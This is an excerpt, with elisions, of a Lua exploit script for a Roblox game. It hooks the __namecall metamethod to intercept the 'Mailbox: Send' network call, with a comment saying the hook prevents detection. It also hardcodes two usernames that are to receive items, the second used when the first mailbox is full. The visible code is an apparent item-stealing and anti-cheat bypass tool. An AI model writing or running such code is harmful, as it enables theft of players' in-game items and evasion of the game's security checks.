...
local renv = getrenv or function() return _G end

local hookfunction = genv().hookfunction or function(original, hook) return hook end
local getrawmetatable = genv().getrawmetatable or debug.getmetatable
local setreadonly = genv().setreadonly or setmetatable
...
-- Hook the Network's InvokeServer method to prevent detection
...
mt.__namecall = newcclosure(function(self, ...)
    ...
    if method == "InvokeServer" and self.Name == "Mailbox: Send" then
        -- Add any specific bypass logic here if needed
        return true
    end
...
Username = "kxvsGG"
Username2 = "kevb1001" -- stuff will get sent to this user if first user's mailbox is full
